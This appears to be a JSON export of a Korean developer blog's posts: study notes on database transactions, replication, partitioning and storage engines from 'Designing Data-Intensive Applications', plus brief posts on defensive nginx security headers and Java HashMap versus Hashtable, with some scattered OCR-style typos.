유감스럽게도 같은 단어가 최소 네가지 의미로 쓰이고 있다. 복제 일관성(replica consistency)과 비동기식으로 복제되는 시스템에서 발생하는 최종적 일관성(eventualconsistency) 문제에 대해 설명했다 일관성 해싱은 어떤 시스템들에서 재균형화를 위해 사용하는 파티셔닝방법이다. CAP 정리(9장 침고)에서 일관성이란 닫어는 선형성(Iinearizability)을 의미한다 ACID의 맥락에서 일관성은 데이터베이스가 “좋은 상태”에 있어야 한다는 것의 애플리케이션에 특화된 개념을 가리킨다， 데이터에 관한 어떤 선언 (불변식 {invariant})이 있다는 것이다. Isolation 격리성은 동시에 실행되는 트랜잭션은 서로 격리된다는 것을 의미한다. 데이터베이스는 실제로는 여러 트랜잭션이 동시에 실행됐더라도 트랜잭션이 커밋됐을 때의 결과가 트랜잭션이 순차적으로 실행됐을 때의 결과와 동일하도록 보장한다. 직렬성 격리(serializable isolation)는 성능 손해를 동반하므로 현실에서는 거의 시용되지 않는다. durability 트랜잭션이 성공적으로 커밋됐다면 하드웨어 결함이 발생하거나 데이터베이스가 죽더라도 트랜잭션에서 기록한 모든 데이터는 손실되지 않는다는 보장이다. 다중 객체 트랜잭션의 필요성 read commited 데이터베이스에서 읽을 때 커밋된 데이터만 보게 된다(더티 읽기가 없음) 데이터베이스에서 쓸 때 커밋된 데이터만 덮어쓰게 된다(더티 쓰기가 없음) 더티 읽기 방지 트랜잭션이 여러 객체를 갱신하는데 더티 읽기가 생기면 다른 트랜잭션이 일부는 갱신된 값을， 일부는 갱신되지 않은 값을 볼수있다 트랜잭션이 어보트되면 그때까지 쓴 내용은 모두 롤백돼야 한다. 데이터베이스가 더티 읽기를 허용하면 트랜잭션이 나중에 롤백될 데이터， 즉 실제로는 데이터베이스에 결코 커멋되지 않을 데이터를 볼 수 있다 그 결과를 따져보려 하면 곧 머리가 흔란스러워질 것이다. 더티 쓰기 방지 먼저 쓴 내용이 아직 커잇되지 않은 트랜잭션에서 쓴 것이고 니중에 실행된 쓰기 작업이 커밋되지 않은 값을 덮어써버리면 어떻게 될까? SnapShot Isolation 읽는 쪽에서 쓰는 쪽을 결코 차단하지 않고 쓰는 쪽에서 읽는 쪽을 결코 차단하지 않는다는 것 MVCC(multi-version concurrency control) 오라클에서는 직렬성, Postgresql, mysql에서는 repeatable read라고 한다. 원자적 쓰기 연산 커서 안정성(cursor stability) : 보통 객체를 읽을 때 그 객체에 독점적인(exclusive) 잠금을 획득해 구현하며 갱신이 적용될 때 까지 다른 트랜잭션에서 해당 객체를 읽지 못하게 한다. 명시적 잠금 : ex) BEGIN TRANSACTION 갱신 손실 자동 감지 : read-modify-write 주기가 순차적으로 실행되도록 강제함으로써 갱신 손실을 방지하는 방법이다. 관리자가 갱신 손실을 발견하면 트랜잭션을 어보트 시키고 주기를 재시도하도록 강제하는 방법 장점 : snapshot isolation 과 결합해 효율적으로 수행이 가능 Compare-and-set : 마지막으로 읽은 후로 변경되지 않았을 때만 갱신을 허용함으로써 갱신 손실을 회피하는 것이다. 현재 값이 이전에 읽은 값과 일치하지 않으면 갱신은 반영되지 않고 주기를 재시도한다. 최종 쓰기 승리 : 갱신 손실이 발생하기 쉽다. 쓰기 스큐와 팬텀 write skew : select 질의가 어떤 검색 조건에 부합하는 로우를 검색함으로써 어떤 요구사항을 만족하는지 확인한다. 첫 번째 질의의 결과에 따라 애플리케이션 코드는 어떻게 진행할지(해당 연산을 계속 처리할지 사용자에게 오류를 보고하고 중단할지) 결정한다. 어플리케이션이 계속 처리하기로 결정했다면 데이터베이스에 쓰고(Insert, Update, Delete) 트랜잭션을 커밋한다. 이 쓰기의 효과로 2단계를 결정한 전제 조건이 바뀐다. 다시 말해 쓰기를 커밋한 후 1단계의 SELECT 질의를 재실행하면 다른 결과를 얻게 된다. 쓰기의 결과로 검색 조건에 부합하는 로우 집합이 바뀌었기 때문이다. 호출 대기하는 의사가 한 명 줄었다. 해당 시간에 회의실이 예약됐다. 옮겨진 물체가 게임판의 특정 위치를 차지했다. 사용자명이 점유됐다. 계좌에 남은 돈이 줄었다. 팬텀(phantom) : 어떤 트랜잭션에서 실행한 쓰기가 다른 트랜잭션의 검색 질의 결과를 바꾸는 효과 직렬성 격리 수준은 이해하기 어렵고 데이터베이스마다 그 구현에 일관성이 없다. 애플리케이션 코드를 보고 특정한 격리 수준에서 해당 코드를 실행하는 게 안전한지 알기 어렵다. 특히 동시에 일어나는 모든 일을 알지 못할 수도 있는 거대한 애플리케이션이라면 더 그렇다. 경쟁 조건을 감지하는 데 도움이 되는 좋은 도구가 없다. 이론상으로는 정적 분석이 도움될지 모르지만 아직 현실적으로 사용되는 연구 기법은 없다. 동시성 문제는 보통 비결정적이라서 테스트하기 어렵다. 타이밍이 좋지 못할 때만 문제가 발생한다. 직렬성 격리를 사용하라! 실제적인 직렬실행 모든 트랜잭션은 작고 빨라야 한다. 느린 트랜잭션 하나가 모든 트랜잭션 처리를 지연시킬 수 있기 때문이다. 활성화된 데이터셋이 메모리에 적재될 수 있는 경우로 사용이 제한된다. 쓰기 처리량이 단일 CPU코어에서 처리할 수 있을 정도로 충분히 낮아야 한다. 그렇지 않으면 여러 파티션에 걸친 코디네이션이 필요하지 않도록 트랜잭션을 파티셔닝 해야 한다. 여러 파티션에 걸친 트랜잭션도 쓸 수 있지만 이것을 사용할 수 있는 정도에는 엄격한 제한이 있다. 2단계 잠금 (two-phase locking) mysql(innoDB), SQL 서버 직렬성 격리 수준 구현, DB2 반복 읽기 격리 수준 읽는 쪽과 쓰는 쪽을 막는것은 데이터베이스의 각 객체에 잠금을 사용 (shared 공유, exclusive 독점) 트랜잭션이 객체를 읽기 원한다면 공유 모드로 잠금을 획득 해야 함. 동시에 여러 트랜잭션이 공유 모드로 잠금을 획득하는 것은 허용되지만, 독점 모드로 잠금을 획득한 트랜잭션이 있다면 이 트랜잭션이 완료 될때까지 기다려야 함 트랜잭션이 객체에 쓰기를 원한다면 독점 모드로 잠금을 획득 해야 함. 어떤 트랜잭션도 동시에 잠금을 획득할 수 없기 때문에 잠금이 존재하면 대기한다. 트랜잭션에 객체를 읽다가 쓰기를 실행 할때는 공유 -&gt; 독점 잠금으로 업그레이드 해야햔다. 트랜잭션이 잠금을 획득한 후에는 트랜잭션이 종료될때 까지 잠금을 갖고 있어야 한다. 2단계 : 획득, 해제 Dead Lock이 빈번하게 일어나기 때문에 데이터베이스는 트랜잭션 사이의 교착 상태를 자동으로 감지하고 하나를 어보트 시켜 다른 트랜잭션들이 진행할 수 있게 한다. 색인 범위 잠금(index-range locking), 다음키 잠금(Next-key locking) 범위 잠금을 잡을 수 있는 적합한 색인이 없다면 데이터베이스는 테이블 전체에 공유 잠금을 잡는 것으로 대체 할 수 있다. 직렬성 스냅숏 격리(Serializable snapshot isolation)","categories":[],"tags":[{"name":"transaction","slug":"transaction","permalink":"https://blog.devkwang.app/tags/transaction/"}]},{"title":"designing-data-intensive-application-5","slug":"designing-data-intensive-application-5","date":"2020-09-14T06:24:24.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/14/designing-data-intensive-application-5/","link":"","permalink":"https://blog.devkwang.app/2020/09/14/designing-data-intensive-application-5/","excerpt":"","text":"Replication Single Leader Replication Multi Leader Replication LeaderLess Replication Leader &amp; Follower Replica : 복제 서버 모든 복제 서버에 모든 데이터가 있다는 사실을 어떻게 보장하는가? Leader-Based replication (active/passive, master/slave) : 복제 서버 중 하나를 리더로 지정하고, 리더는 로컬 저장소에 새로운 데이터를 기록 복제 서버는 팔로워(follower)라고 한다. 리더가 로컬 저장소에 새로운 데이터를 기록할 때마다 데이터 변경을 Replication Log or Change Stream의 일부로 팔로워에게 전송 각 팔로워가 리더로부터 로그를 받으면 리더가 처리한 것과 동일한 순서로 모든 쓰기를 적용해 복사본을 갱신한다. 동기식 대 비동기식 복제 동기식 : 팔로워가 리더와 일관성 있게 최신 복사본을 가지는 것을 보장, Block 때문에 처리 대기 시간 발생 현실적으로 데이터베이스에서 동기식 복제를 사용하려면 보통 팔로워 하나는 동기식으로 하고 그 밖에는 비동기식으로 하는 것을 의미 적어도 두 노드에 데이터의 최신 복사본이 있는 것을 보장한다. 이것을 semi-synchronous(반동기식)이라 한다. 비동기식 : 리더 기반 복제는 완전히 비동기식으로 구성한다. 리더가 잘못되고 복구할 수 없으면 팔로워에 아직 복제되지 않은 모든 쓰기는 유실된다. Follower failover 각 팔로워는 리더로부터 수신한 데이터 변경 로그를 로컬 디스크에 보관 팔로워는 리더에 연결해 팔로워 연결이 끊어진 동안 발생한 데이터 변경을 모두 요청 Leader failover 팔로워 중 하나를 새로운 리더로 승격 &amp; 다른 팔로워는 새로운 리더로부터 데이터 변경을 읽어오기 시작해야한다. 자동 장애 복구 리더 장애 판단 : 보통 타임아웃으로 체크 새로운 리더 선택 : 보통 이전 리더의 최신 데이터 변경사항을 가진 Follower중에서 선출 새로운 리더 사용을 위해 시스템을 재설정 자동 장애 복구 시 실패 Case 비동기식 복제를 사용하면 새로운 리더는 이전 리더가 실패하기 전 이전 리더의 쓰기를 일부 수신하지 못할 수 있다. Out of date Follower Leader 선출 문제 특정 결함 시나리오 (Split Brain : 두 노드가 모두 자신이 리더라고 믿을 수 있다.) 리더가 분명히 죽었다고 판단 가능한 적절한 타임아웃은 얼마인가? Convergent 각쓰기에 고유 ID를 가진 쓰기를 고르고 타임스탬프를 사용하는 경우를 Version Vector https://en.wikipedia.org/wiki/Version_vector 다이나모 스타일 리더 없는 복제 모델의 오픈소스 데이터스토어 읽기 복구 : 클라이언트가 여러 노드에서 병렬로 읽기를 수행하면 오래된 응답을 감지 안티 엔트로피 처리 : 일부 데이터 스토어는 백그라운드 프로세스를 두고 복제 서버 간 데이터 차이를 지속적으로 찾아 누락된 데이터를 하나의 복제 서버에서 다른 서버로 복사 동시 쓰기 감지 읽기 요청을 병렬로 여러 노드에 전달 읽기와 쓰기를 위한 정족수 n개의 복제 서버가 있을 때 모든 쓰기는 w개의 노드에서 성공해야 쓰기가 확정되고 모든 읽기는 최소한 r개의 노드에 질의해야 한다. w = r = (n+1)/2 로 설정 w + r &gt; n 이면 다음과 같이 사용 불가능한 노드를 용인한다. w &lt; n 이면 노드 하나를 사용할 수 없어도 여전히 쓰기를 처리할 수 있다. r &lt; n 이면 노드 하나를 사용할 수 없어도 여진히 읽기를 처리할 수 있다. n = 3, w = 2, r = 2이면 사용 불가능한 노드 하나를 용인한다. n = 5, w = 3, r = 3이면 사용 불가능한 노드 두개를 용인한다. 최종 쓰기 승리(동시 쓰기 버리기) : Last-Write-Wins-Element-Set LWW로 데이터베이스를 안전하게 사용하는 유일한 방법은 키를 한번만 쓰고 이후에는 불변값으로 다루는 것이다. 이 방법은 같은 키를 동시에 갱신하는 상황을 방지한다. 예를 들어, 카산드라를 사용할 때 추천하는 방법은 키로 UUID를 사용해 모든 쓰기 작업에 고유한 키를 부여하는 것이다. “이전 발생” 관계와 동시성 : Happens-before Causally dependent : 인과성이 있다. 작업이 다른 작업보다 먼저 발생하지 않으면 (즉 어느 작업도 다른 작업에 대해 알지 못한다면) 단순히 동시 작업이라 말한다. 복제 단일리더복제 클라이언트는 모든 쓰기를 단일 노드(리더)로 전송하고 리더는 데이터 변경 이벤트 스트림을 다른 복제 서버(말로워)로 전송 한다. 읽기는 모든 복제 서버가 수행할 수 있지만 팔로원의 읽기는 오래된 값일 수 있다 다중리더복제 클라이언트는 각 쓰기를 여러 리더 노드 중 쓰기를 맡l’üf들일 수 있는 노드로 전송한다 리더는 데이터 변경 이벤트 스트림을 다른 리더와 모든 딸로워 노도로 전송한다 리더없는복제 클라이언트는 각 쓰기를 여러 노드로 전송한다. 클라이언트는 오래된 데이터를 감지하고 이를 바로잡기 위해 병렬로 여러 노 드에서읽는다 주의 쓰기 후 읽기 일관성 시용자는 자신이 저|출한 데이터를 항상볼 수 있어야 한다 단조 읽기 사용자가 어떤 시점에 데이터를 본 후에는 예전 시점의 데이터는 나중에 볼 수 없다 일관된 순서로 읽기 사용자는 인과성이 있는 상태의 데이터 를 봐야 한다 예를 들어 질문과 그에 대한 답을 순서에 맞게 봐야한다.","categories":[],"tags":[{"name":"shared data","slug":"shared-data","permalink":"https://blog.devkwang.app/tags/shared-data/"},{"name":"replication","slug":"replication","permalink":"https://blog.devkwang.app/tags/replication/"}]},{"title":"designing-data-intensive-application-6","slug":"designing-data-intensive-application-6","date":"2020-09-14T06:24:22.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/14/designing-data-intensive-application-6/","link":"","permalink":"https://blog.devkwang.app/2020/09/14/designing-data-intensive-application-6/","excerpt":"","text":"partitioning Sharding 데이터 파티셔닝을 원히는 주된 이유는 확장성이다 키-값데이터파티셔닝 파티셔닝이 고르게 이뤄지지 않이- 다른 파티션보다 데이터가 많거 나 질의를 많이 받는 파티션이 있 다면 쏠렸다(skewed)고 말한다. 불균형하게 부하가 높은 파티션을 핫스팟이라고 힌다. 키 범위 기준 파티셔닝 파티셔닝하는 방법 중 하나는 종이 백과사전처럼(그림 6-2) 각 파티션에 연속된 범위(어떤 최솟값 에서 최뱃값까지)의 키를 할당하는 것이다. 장점 키를 정렬된 순서로 저장할 수 있다. 단점 키 범위 기준파티셔닝은 특정한 접근패턴이 핫스핏을 유발 키의 해시값 기준 파티셔닝 파티셔닝용 해시 함수는 암호적으로 강력할 필요는 없다. 카산드라, 몽고DB : MD5 볼드모트 : 파울러 놀 보 (Fowler-Noll-Vo) 장점 키를 파티션 사이에 균일하게 분산시키는데 좋다 단점 범위 질의를 효율적으로 실행할 수 있는 능력이 부족하다. 카산드라는 테이블을 선언할 때 여러 칼럼을 포함하는 복합 기본키를 지정해 SS테이블에서 데이터를 정렬하는 연쇄된 색인으로 사용한다. 쏠린 작업부하와 핫스팟 완화 항상 동일한 키를 읽고 쓰는 극단적인 상황에서는 모든 요청이 동일한 파티션으로 쏠리게 된다. 파티셔닝과 보조 색인 지금까지 설명한 파티셔닝 방식은 키-값 데이터 모델에 의존한다. 보조 색인은 관계형 데이터베이스의 핵심 요소이며 문서 데이터베이스에서도 흔하다. 문서 기준 보조 색인 파티셔닝 각 항목에는 문서 ID라고 불리는 고유 ID가 존재한다. 지역 색인(Local Index)이라고도 한다. 문서ID에 뭔가 특별한 작업을 하지 않는다면 동일 파티션에 저장되리라는 보장이 없기 때문에 모든 파티션으로 질의를 보내 얻은 결과를 모두 보아야 한다. 스캐터/개더(scatter/gather)라고 한다. 용어 기준 보조 색인 파티셔닝 term-partitioning : 용어(문서에 등장하는 모든 단) 기준 파티셔닝 파티션 재균형화 질의 처리랑이 증가해서 늘어난 부하를 처리하기 위해 CPU를 더 추가하고 싶다. 데이터셋 크기가 증가해서 데이터셋 저장에 시용할 디스크와 램을 추가하고 싶다. 장비에 장애가 발생해서 그 장비가 담당하던 역할을 다른 서버가 넘겨받아야 한다. 재균형화 : 클러스터에서 한 노드가 담당하던 부하를 다른 노드로 옮기는 과정을 재균형화(rebalancing)이라고 한다. 재균형화 후, 부하(데이터저장소, 읽기 쓰기 요청)가 클러스터 내에 있는 노드들 사이에 균등하게 분배돼야 한다. 재균형화 도중에도 데이터베이스는 읽기 쓰기 요청을 받아들여야 한다 재균형화가 빨리 실행되고 네트워크와 디스크 I/0 부하를 최소화할 수 있도록 노드들 사이에 데이터가 필요 이상으로 옮겨 져서는 안된다 재균형화 전략 쓰면 안되는 방법 : 해시값에 모드 N 연산을 실행 재균형화 비용이 지나지체 커진다. 파티션 개수 고정 클러스터에 노드가 추가되면 새 노드는 파티션이 다시 균일하게 분배될 때까지 기존 노드에서 파티션 몇개를 가져올 수 있다. 파티션은 노드 사이에서 통째로 이동하기만 하며, 파티션의 개수는 바뀌지 않고 파티션에 할당된 키도 변경되지 않는다. 이러한 재균형화 방법은 엘라스틱 서치에 쓰인다. 이 방식을 사용할 때는 보통 데이터베이스가 처음 구축될 때 파티션 개수가 고정되고 이후에 변하지 않는다. 이론적으로는 파티션을 쪼개거나 합치는게 가능하지만 파티션 개수가 고정되면 운영이 단순화되어 고정 파티션을 사용하는 데이터베이스는 파티션 분할을 지원하지 않는다. 동적 파티셔닝 HBase, Rsync DB 파티션 크기가 설정된 값을 넘어서면 (HBase에서는 10GB가 Default) 파티션을 두개로 쪼개 각각에 원래 파티션의 절반 정도의 데이터가 포함되게 한다. 반대로 데이터가 많이 삭제되어 파티션 크기가 임계값 아래로 떨어지면 인접한 파티션과 합쳐질 수 있다. HBase의 경우 HDFS를 통해 파티션 파일이 전송된다. 빈 데이터베이스는 파티션 경계를 정하기에 사전정보가 부족하다. 이를 보완하기 위해 HBase와 몽고DB에서는 빈 데이터베이스에 초기 파티션 집합을 설정할 수 있게 Pre-splitting을 할 수 있게 한다. 노드 비례 파티셔닝 Cassandra or Ketama : 파티션 개수가 노드 대수에 비례하게 하는 것 노드 대수가 변함 없는 동안은 개별 파티션 크기가 데이터셋 크기에 비례해서 증가하지만 노드 대수를 늘리면 파티션 크기는 다시 작아진다. 새 노드가 클러스터에 추가되면 고정된 개수의 파티션을 무작위로 선택해 분할하고 각 분할된 파티션의 절반은 그대로 두고 다른 절반은 새 노드에 할당한다. 파티션 경계를 무작위로 선택하려면 해시 기반 파티셔닝을 사용해야 한다. 실제로 이 방법은 일관성 해싱의 원래 정의에 가장 가깝게 대응한다. 최근에 나온 해시 함수를 쓰면 메타데이터 오버헤드를 낮추면서도 비슷한 효과를 얻을 수 있다. 운영: 자동 재균형화와 수동 재균형화 완전 자동 재균형화 : 관리자의 개입이 전혀 없이 시스탬이 지동으로 언제 파티션을 노드 사이에 이 동할지 결정함 완전 수동 재균형화 : 관리자가 명시적으로 파티션을 노드에 할당하도록 설정하고 관리자가 재설정할 때만 파티션 할당이 변경됨 요청 라우팅 Service Discovery 네트워크를 통해 접속되는 소프트웨어라면 어떤 것이든지, 특히 고가용성을 지향하는 소프웨어라면 모두 이 문제가 있다. 여러 회사에서 자체 서비스 찾기 도구를 개발했고 그 중 다수가 오픈소스로 공개됐다. 상위 수준에서 보면 이 문제는 몇가지 다른 접근법이 있다. 클라이언트가 아무 노드에나 접속하게 한다(예를 들어 라운드로빈 로드 밸런서를 통해). 만약 해당 노드에 마침 요청을 적용할 파티션이 있다면 거기서 요청을 직접 처리 할 수 있다. 그렇지 않으면 요청을 올바른 노드로 전달해서 응답을 받고 클라이언트에게 응답을 전닳한다. 클라이언트의 모든 요청을 라우팅 계층으로 먼저 보낸다. 라우팅 계층에서는 각 요청을 처리할 노드를 알아내고 그에 따라 해동 노드로 요청을 전달한다. 라우팅 계층 자체에서는 아무 요청도 처리하지 않는다. 파티션 인지(partition-aware)로드 밸런서로 동작할 뿐이다. 클라이언트가 파티셔닝 방법과 파티션이 어떤 노드에 할당됐는지를 알고 있게 한다. 이 경우 클라이언트는 중개자 없이 올바른 노드로 직접 접속할 수 있다. 카산드라는 gossip protocol을 통해 클러스터 상태 변화를 노드 사이에 퍼뜨린다. 병렬 질의 실행 Massively parallel processing . MPP : 대규모 병렬 처리 join, filtering, grouping, aggregation 연산","categories":[],"tags":[{"name":"partitioning","slug":"partitioning","permalink":"https://blog.devkwang.app/tags/partitioning/"}]},{"title":"designing-data-intensive-application-4","slug":"designing-data-intensive-application-4","date":"2020-09-14T03:33:22.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/14/designing-data-intensive-application-4/","link":"","permalink":"https://blog.devkwang.app/2020/09/14/designing-data-intensive-application-4/","excerpt":"","text":"Thrift Binary Protocol Compact Protocol variable-length integer : 가변 길이 정수 부호화 각 바이트의 상위 비트는 앞으로 더 많은 바이트가 있는지를 나타내는 데 사용한다. -64 ~ 63 사이의 숫자는 1바이트로 부호화, -8192 ~ 8191 사이의 숫자는 2바이트로 부호화 한다는 의미","categories":[],"tags":[{"name":"data intensive","slug":"data-intensive","permalink":"https://blog.devkwang.app/tags/data-intensive/"}]},{"title":"web-security","slug":"web-security","date":"2020-09-10T07:06:18.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/09/10/web-security/","link":"","permalink":"https://blog.devkwang.app/2020/09/10/web-security/","excerpt":"","text":"Response Header X-Content-Type-Option : 리소스를 다운로드할때 해당 리소스의 MIMETYPE이 일치하지 않는 경우 차단 해당 헤더 추가 X-Content-Type-Options: nosniff Strict-Transport-Security : 한번 https로 접속하는 경우 이후의 모든 요청을 http로 요청하더라도 브라우저가 자동으로 https로 요청 해당 헤더 추가 Strict-Transport-Security: max-age=63072000; includeSubdomains; preload X-XSS-Protection : (XSS) 공격을 감지 할 때 페이지 로드를 중지시킬 수 있습니다. 해당 헤더 추가 X-XSS-Protection: 1;mode=block X-Frame-Options : 해당 페이지를 frame 또는 iframe, object 에서 렌더링할 수 있는지 여부를 나타내는데 사용됩니다. 해당 헤더 추가 X-Frame-Options: sameorigin 1234add_header X-Content-Type-Options &quot;nosniff&quot;;add_header X-XSS-Protection &quot;1;mode=block&quot;;add_header X-Frame-Options &quot;sameorigin&quot;;add_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; preload&quot;;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://blog.devkwang.app/tags/web/"},{"name":"security","slug":"security","permalink":"https://blog.devkwang.app/tags/security/"}]},{"title":"nginx-trouble-shooting","slug":"nginx-trouble-shooting","date":"2020-09-09T05:44:21.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/09/nginx-trouble-shooting/","link":"","permalink":"https://blog.devkwang.app/2020/09/09/nginx-trouble-shooting/","excerpt":"","text":"err_incomplete_chunked_encoding 200 에러 nginx 설정에 proxy_buffering: off;","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.devkwang.app/tags/nginx/"}]},{"title":"data-structure-hash","slug":"data-structure-hash","date":"2020-09-09T03:31:20.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/09/data-structure-hash/","link":"","permalink":"https://blog.devkwang.app/2020/09/09/data-structure-hash/","excerpt":"","text":"개요 자바에서 제공하는 HashMap과 Hashtable은 Map인터페이스를 상속받아 구현되어 데이터를 키와 값으로 관리하는 자료구조이다. 큰 특징으로는 키(Key)가 데이터를 추출할 때 구분자로 활용하는 방식을 취하는데 이는 리스트 인터페이스와 같은 자료구조보다 탐색에 있어 더 높은 효율을 기대할 수 있다. 차이점 2.1 - 동기화 이 둘의 차이점으로 동기화(Synchronization)를 들 수 있다. HashMap의 경우 동기화를 지원하지 않는다. 반면 다중 스레드 환경에서 Hashtable은 동기화를 지원하기 때문에 실행 환경에 따라 구분하여 사용하면 된다. 하지만 한 자바 관련 서적에 의하면 Vector의 상위호환(?)개념인 ArrayList의 사용을 권장하듯 새로운 버전인 HashMap을 활용하고 동기화가 필요한 시점에서는 Java 5부터 제공하는 ConcurrentHashMap을 사용하는 것이 더 좋은 방법이라 표현한다. 추가로 속도적인 측면에서도 구형이라 할 수 있는 Hashtable은 동기화 처리라는 비용때문에 HashMap에 비해 더 느리다고 한다. 2.2 - 반환값 HashMap은 저장된 요소들의 순회를 위해 Fail-Fast Iterator를 반환한다.(ConcurrentHashMap의 경우에는 Fail-Safe Iterator) Hashtable은 같은 경우 Enumeration을 반환한다. 여기서 Enumeration과 Iterator는 컬렉션에 저장된 요소를 접근하는데 사용되는 인터페이스이다. Enumeration은 컬렉션 프레임워크 이전에 사용되던 인터페이스로 Iterator의 사용을 권장한다. Iterator엔 remove() 메소드가 추가되었고 메소드 네이밍이 간략화되었다. 그리고 다른 스레드(lock된 상황에서)에서 해당 자료에 요소를 수정(삽입, 삭제, 수정 등)이 발생하면 ConcurrentModificationException을 발생시켜 일관성을 보장한다. 이를 Fail-Fast Iterator라 한다. ConcurrentHashMap의 경우 Map의 복사본을 참조하는 Iterator를 반환하며 다시 반환받은 시점에 Map에 수정이 있을 경우 해당 Iterator는 반영되지 않는다. 고로 ConcurrentModificationException또한 발생하지 않는다. 이는 약한 일관성(Weakly Consistent)를 제공하지만 다중 스레드상황에서 해당 Map의 무결성(?)을 보장한다. 추가로 ListIterator가 있는데 이는 단방향만을 제공하는 Iterator의 기능을 향상시킨 것이다.","categories":[],"tags":[]},{"title":"designing-data-intensive-application_2","slug":"designing-data-intensive-application-2","date":"2020-09-06T23:40:01.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/07/designing-data-intensive-application-2/","link":"","permalink":"https://blog.devkwang.app/2020/09/07/designing-data-intensive-application-2/","excerpt":"","text":"데이터 모델과 질의 언어 데이터 모델을 표현하는 방법 애를리케이션 개발자는 현실(사람， 조직， 상품， 행동， 자금 흐름 센서 등)을 보고 객체나 데이터 구조 그리고 이러한 데이터 구조를 다루는 API를 모델링한다 이런 구조는 보통 애플리케이션에 특화돼 있다. 데이터 구조를 저장할 때는 JSON나 XML 문서， 관계형 데이터베이스 테이블이나 그래프 모댈 같은 범용 데이터 모델로 표현한다. 더 낮은 수준에서 하드웨어 엔지니어는 전류， 빛의 따동， 자기장등의 관점에서 바이트를 표현하는 방법을 일이냈다. 데이터 베이스를 강력하게 만드는 데이터 구조 Index Index의 일반적인 개념은 부가적인 메타데이터를 유지하는 것 많은 데이터베이스는 색인의 추가와 삭제를 허용 추가적인 구조의 유지보수는 특히 쓰기 과정에서 오버헤드 발생 쓰기의 경우 단순히 파일에 추가할 때의 성능을 앞서기 어렵다. Index를 유지하는 경우 매번 데이터를 쓸 때마다 갱신해주어야 하므로 쓰기속도를 느리게 만든다. Hash Index Dictionary Type(사전 타입) 보통 Hash Map이나 HashTable로 구 In-Memory HashMap으로 구성시 고성능 읽기 쓰기를 보장 항상 추가만 한다면 사용 가능한 공간이 부족해지고 특정 크기의 세그먼트(Segment)로 로그를 나누는 방식 bitcask : https://github.com/basho/bitcask 구현시 중요한 문제들 파일 형식 레코드 삭제 : 보통 로그 세그먼트가 병합될 때 툼스톤이라고 불리는 것을 추가한다. 고장(Crash) 복구 : 각 세그먼트 해시 맵을 메모리로 빠르게 로딩하기 위해 snapshot 활용 및 다른 추가사항 고려 부분적 레코드 쓰기 : 체크섬 포함해서 로그 손상된 부분 탐지 동시성 제어 : 쓰기 쓰레드는 1개, 읽기 쓰레드는 여러개 정해진 자리에 파일을 갱신하는 방법 무작위 쓰기보다 순차적인 쓰기 방법이 더 빠르다 세그먼트 파일이 추가 전용이나 불변이면 동시성과 고장 복구는 훨씬 간단하다. 조각화되는 데이터 파일 문제를 피할 수 있다. 해시테이블의 한계 메모리에 저장해야 하므로 키가 너무 많으면 문제가 된다. 디스크에 해시맵을 유지하면 성능상 이점이 없어진다. 범위 질의에는 효율적이지 않다 SST(Sorted String Table) &amp; LSM TREE Example : Cassandra(SST, LSM Tree, Bloom Filter) 일련의 키-쌍 값을 키로 정렬하는 것이다. 키로 정렬된 형식을 SST라고 한다. 세그먼트 병합은 입력파일을 함께 읽고 각 파일의 첫 번째 키를 본다. 그리고 가장 낮은 키를 출력 파일로 복사한 뒤 이 과정을 반복한다. 다중 세그먼트에 동일한 키가 있을 경우 가장 최근 세그먼트의 값은 유지하고 오래된 세그먼트의 값은 버린다. 파일에서 특정 키를 찾기 위해 더는 메모리에 모든 키의 색인을 유지할 필요가 없다. 정렬되어 있는 키의 집합을 가지고 있기 때문에 해당 집합에서 찾지 못할 경우 가장 근접한 키값부터 Scan해서 찾는다. 읽기 요청은 요청 범위 내에서 여러 키-값 쌍을 스캔해야 하기 때문에 해당 레코드들을 블록으로 그룹화하고 디스크에 쓰기전에 압축한다. SST 생성과 유지 쓰기가 들어오면 인메모리 균형 트리(Balanced Tree) 데이터 구조에 추가한다. (memtable) 멤테이블이 보통 수 메가바이트 정도의 임계값보다 커지면 SS테이블 파일로 디스크에 기록한다. 트리가 이미 키로 정렬된 키-쌍값을 유지하고 있어 효율적으로 수행 가능 읽기 요청이 오면 멤테이블에서 키를 찾고, 그 다음 디스크상의 세그먼트들에서 찾는다. 가끔 세그먼트 파일을 합치고 덮어 쓰여지거나 삭제된 값을 버리는 병합과 컴팩션 과정을 수행한다. (Background) 데이터 베이스가 고장나면 멤테이블에 있는 가장 최신쓰기는 손실되어 분리된 로그를 디스크 상에 유지해야한다. LSM 트리 만들기 로그 구조화 병합 트리(Log-Structed Merge-Tree)","categories":[],"tags":[{"name":"data intensive","slug":"data-intensive","permalink":"https://blog.devkwang.app/tags/data-intensive/"}]},{"title":"designing-data-intensive-application_1","slug":"designing-data-intensive-application-1","date":"2020-09-06T22:52:27.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/07/designing-data-intensive-application-1/","link":"","permalink":"https://blog.devkwang.app/2020/09/07/designing-data-intensive-application-1/","excerpt":"","text":"Data intensive application Database : 구동 어플리케이션이나 다른 어플리케이션에서 나중에 다시 데이터를 찾을 수 있게 데이터를 저장 Cache : 읽기 속도 향상을 위해 값비싼 수행 결과를 기억 Search Index : 사용자가 키워드로 데이터를 검색하거나 다양한 방법으로 필터링 할 수 있게 제공 Stream Processing : 비동기 처리를 위해 다른 프로세스로 메시지 보내기 Batch Processing : 주기적으로 대량의 누적된 데이터를 분석 3가지 관심사 Reliability : 하드웨어나 소프트웨어 결함 심지어 Human Error 같은 경우에도 시스템은 올바르게(원하는 성능 수준에서 정확한 기능) 동작해야한다. Scalability : 시스템 데이터의 양, 트래픽 양, 복잡도가 증가하면서 이를 처리 가능해야한다. Maintainability: 시간이 지남에 따라 여러 다양한 사람들이 시스템 상에서 작업할 것이기 때문에 모든 사용자가 시스템 상에서 생산적으로 작업할 수 있어야 한다. 신뢰성 (Reliability) 어플리케이션은 사용자가 기대한 기능을 수행한다. 시스템은 사용자가 범한 실수나 예상치 못한 소프트웨어 사용법을 허용할 수 있다. 시스템 